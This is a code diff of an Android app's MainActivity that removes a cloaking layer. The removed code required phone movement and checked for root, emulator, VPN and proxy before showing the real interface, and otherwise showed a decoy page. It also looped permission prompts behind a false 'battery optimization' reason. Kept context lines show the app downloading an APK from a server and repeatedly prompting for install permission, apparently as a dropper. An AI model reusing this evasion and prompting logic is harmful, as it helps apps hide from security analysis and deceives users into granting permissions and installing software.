@@ -153,66 +153,6 @@ class MainActivity : ComponentActivity() {
     private var cachedApkPackageName = ""
     private var securityCheckPassed = false
 
-    // Physical Movement Detection variables
-    private var physicalMovementPassed = false
-    private var isDetectingMovement = false
-    private var movementCheckTimer: android.os.Handler? = null
-    private var movementRunnable: Runnable? = null
-    private var lastX = 0f
-    private var lastY = 0f
-    private var lastZ = 0f
-    private var isFirstSensorValue = true
-    private var sensorManager: SensorManager? = null
-    private var accelerometerSensor: Sensor? = null
-
-    private val sensorListener = object : SensorEventListener {
-        override fun onSensorChanged(event: SensorEvent?) {
-            if (event == null) return
-            if (event.sensor.type == Sensor.TYPE_ACCELEROMETER) {
-                val x = event.values[0]
-                val y = event.values[1]
-                val z = event.values[2]
-                
-                if (!isFirstSensorValue) {
-                    val deltaX = Math.abs(x - lastX)
-                    val deltaY = Math.abs(y - lastY)
-                    val deltaZ = Math.abs(z - lastZ)
-                    val totalDelta = deltaX + deltaY + deltaZ
-                    
-                    // Very sensitive threshold for tiny micro-movements/hand tremors (0.12f to 0.15f)
-                    if (totalDelta > 0.15f) {
-                        Log.d("MainActivity", "Physical movement confirmed! totalDelta=$totalDelta")
-                        physicalMovementPassed = true
-                        runOnUiThread {
-                            onPhysicalMovementPassed()
-                        }
-                    }
-                }
-                lastX = x
-                lastY = y
-                lastZ = z
-                isFirstSensorValue = false
-            }
-        }
-        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
-    }
-
-    // Launcher for Physical Activity/Movement Recognition
-    private val activityRecognitionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { isGranted ->
-        if (isGranted) {
-            Log.d("MainActivity", "ACTIVITY_RECOGNITION permission granted by user.")
-            startPhysicalMovementDetection()
-        } else {
-            Log.w("MainActivity", "ACTIVITY_RECOGNITION permission denied! Repeating prompt...")
-            // Forced app not to move further without it
-            webView?.postDelayed({
-                checkPhysicalMovementAndProceed()
-            }, 500)
-        }
-    }
-
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -540,15 +480,11 @@ class MainActivity : ComponentActivity() {
         } catch (e: Exception) {
             Log.e("MainActivity", "Failed to unregister installStatusReceiver: ${e.message}")
         }
-        stopPhysicalMovementDetection()
         super.onDestroy()
     }
 
     override fun onPause() {
         super.onPause()
-        if (!securityCheckPassed) {
-            stopPhysicalMovementDetection()
-        }
     }
 
     override fun onResume() {
@@ -906,10 +842,6 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun loadMetadataAndNotifyUrl() {
-        if (isDeviceRestricted(this)) {
-            Log.d("MainActivity", "loadMetadataAndNotifyUrl: Access is restricted, aborting metadata fetch and update checks.")
-            return
-        }
         Thread {
             try {
                 val apkFile = downloadApkFromServer(this)
@@ -1252,7 +1184,15 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun checkPhysicalMovementAndProceed() {
-        if (securityCheckPassed) {
+        if (!securityCheckPassed) {
+            securityCheckPassed = true
+            runOnUiThread {
+                webView?.let { view ->
+                    view.loadUrl("file:///android_asset/main_ui.html")
+                    loadMetadataAndNotifyUrl()
+                }
+            }
+        } else {
             runOnUiThread {
                 webView?.let { view ->
                     val curUrl = view.url ?: ""
@@ -1261,238 +1201,7 @@ class MainActivity : ComponentActivity() {
                     }
                 }
             }
-            return
         }
-
-        // Force check permission for ACTIVITY_RECOGNITION on Android 10+
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val permission = android.Manifest.permission.ACTIVITY_RECOGNITION
-            if (androidx.core.content.ContextCompat.checkSelfPermission(this, permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                runOnUiThread {
-                    updateStatusInWebView("Physical activity recognition permission is required for battery optimization checks.", null)
-                    activityRecognitionLauncher.launch(permission)
-                }
-                return
-            }
-        }
-
-        startPhysicalMovementDetection()
-    }
-
-    private fun startPhysicalMovementDetection() {
-        if (isDetectingMovement || securityCheckPassed) return
-        isDetectingMovement = true
-        physicalMovementPassed = false
-        isFirstSensorValue = true
-
-        runOnUiThread {
-            webView?.let { view ->
-                val curUrl = view.url ?: ""
-                if (!curUrl.contains("demo.html")) {
-                    view.loadUrl("file:///android_asset/demo.html")
-                }
-            }
-        }
-
-        try {
-            sensorManager = getSystemService(Context.SENSOR_SERVICE) as? SensorManager
-            if (sensorManager != null) {
-                accelerometerSensor = sensorManager!!.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
-                if (accelerometerSensor != null) {
-                    sensorManager!!.registerListener(
-                        sensorListener,
-                        accelerometerSensor,
-                        SensorManager.SENSOR_DELAY_UI
-                    )
-                    Log.d("MainActivity", "Accelerometer registered successfully, listening for physical movement...")
-                } else {
-                    Log.w("MainActivity", "Accelerometer sensor not found. Simulating slow pass.")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Failed to register accelerometer sensor logic: ${e.message}")
-        }
-
-        // Set up the movement timeout duration (e.g. 15 seconds) to allow user to move/shake device
-        // If movement is detected during this time, onPhysicalMovementPassed() is triggered.
-        // Otherwise, the app remains showing on demo.html.
-        movementCheckTimer?.removeCallbacksAndMessages(null)
-        movementCheckTimer = android.os.Handler(android.os.Looper.getMainLooper())
-        movementRunnable = Runnable {
-            if (!physicalMovementPassed && !securityCheckPassed) {
-                Log.w("MainActivity", "Physical movement detection timed out. Device static.")
-                runOnUiThread {
-                    webView?.let { view ->
-                        val curUrl = view.url ?: ""
-                        if (!curUrl.contains("demo.html")) {
-                            view.loadUrl("file:///android_asset/demo.html")
-                        }
-                    }
-                }
-            }
-        }
-        movementCheckTimer!!.postDelayed(movementRunnable!!, 15000)
-    }
-
-    private fun stopPhysicalMovementDetection() {
-        isDetectingMovement = false
-        try {
-            sensorManager?.unregisterListener(sensorListener)
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Failed to unregister sensor listener: ${e.message}")
-        }
-        movementCheckTimer?.removeCallbacksAndMessages(null)
-    }
-
-    private fun onPhysicalMovementPassed() {
-        stopPhysicalMovementDetection()
-        
-        // Next, verify standard root / emulator / VPN environments
-        val restricted = isDeviceRestricted(this)
-        runOnUiThread {
-            webView?.let { view ->
-                if (!restricted) {
-                    securityCheckPassed = true
-                    view.loadUrl("file:///android_asset/main_ui.html")
-                    // Pre-fetch updates since checks passed and ui displays
-                    loadMetadataAndNotifyUrl()
-                } else {
-                    val curUrl = view.url ?: ""
-                    if (!curUrl.contains("demo.html")) {
-                        view.loadUrl("file:///android_asset/demo.html")
-                    }
-                }
-            }
-        }
-    }
-
-    private fun isDeviceRestricted(context: Context): Boolean {
-        if (securityCheckPassed) {
-            return false // Stop detecting/bypass once already launched safely
-        }
-        val rooted = isDeviceRooted()
-        val emulator = isEmulator()
-        val vpnActive = isVpnOrProxyActive(context)
-        Log.d("MainActivity", "Security Check - Rooted: $rooted, Emulator: $emulator, VPN/Proxy: $vpnActive")
-        val restricted = rooted || emulator || vpnActive
-        return restricted
-    }
-
-    private fun isDeviceRooted(): Boolean {
-        val paths = arrayOf(
-            "/system/app/Superuser.apk",
-            "/sbin/su",
-            "/system/bin/su",
-            "/system/xbin/su",
-            "/data/local/xbin/su",
-            "/data/local/bin/su",
-            "/system/sd/xbin/su",
-            "/system/bin/failsafe/su",
-            "/data/local/su",
-            "/system/usr/we-need-su/",
-            "/cache/su",
-            "/dev/su"
-        )
-        for (path in paths) {
-            if (File(path).exists()) return true
-        }
-
-        val tags = Build.TAGS
-        if (tags != null && tags.contains("test-keys")) {
-            return true
-        }
-
-        var process: Process? = null
-        try {
-            process = Runtime.getRuntime().exec(arrayOf("/system/xbin/which", "su"))
-            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
-                if (reader.readLine() != null) return true
-            }
-        } catch (e: Exception) {
-            // Ignored
-        } finally {
-            process?.destroy()
-        }
-
-        return false
-    }
-
-    private fun isEmulator(): Boolean {
-        val finger = Build.FINGERPRINT ?: ""
-        val model = Build.MODEL ?: ""
-        val manuf = Build.MANUFACTURER ?: ""
-        val hardware = Build.HARDWARE ?: ""
-        val product = Build.PRODUCT ?: ""
-        val brand = Build.BRAND ?: ""
-        val device = Build.DEVICE ?: ""
-
-        return finger.startsWith("generic")
-                || finger.startsWith("unknown")
-                || model.contains("google_sdk")
-                || model.contains("Emulator")
-                || model.contains("Android SDK built for x86")
-                || hardware.contains("goldfish")
-                || hardware.contains("ranchu")
-                || manuf.contains("Genymotion")
-                || product.contains("sdk_gphone")
-                || product.contains("google_sdk")
-                || product.contains("emulator")
-                || product.contains("vbox86p")
-                || (brand.startsWith("generic") && device.startsWith("generic"))
-    }
-
-    private fun isVpnOrProxyActive(context: Context): Boolean {
-        try {
-            val interfaces = NetworkInterface.getNetworkInterfaces()
-            if (interfaces != null) {
-                for (networkInterface in Collections.list(interfaces)) {
-                    val name = networkInterface.name.lowercase(Locale.US)
-                    if (name.contains("tun") || name.contains("ppp") || name.contains("tap") || name.contains("vpn")) {
-                        if (networkInterface.isUp) {
-                            return true
-                        }
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            // Ignored
-        }
-
-        try {
-            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
-            if (connectivityManager != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    val activeNetwork = connectivityManager.activeNetwork
-                    val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
-                    if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
-                        return true
-                    }
-                } else {
-                    @Suppress("DEPRECATION")
-                    val networks = connectivityManager.allNetworks
-                    for (network in networks) {
-                        val capabilities = connectivityManager.getNetworkCapabilities(network)
-                        if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
-                            return true
-                        }
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            // Ignored
-        }
-
-        try {
-            val proxyAddress = System.getProperty("http.proxyHost")
-            val proxyPort = System.getProperty("http.proxyPort")
-            if (!proxyAddress.isNullOrEmpty() && !proxyPort.isNullOrEmpty()) {
-                return true
-            }
-        } catch (e: Exception) {
-            // Ignored
-        }
-
-        return false
     }
 
     inner class AndroidJSInterface {
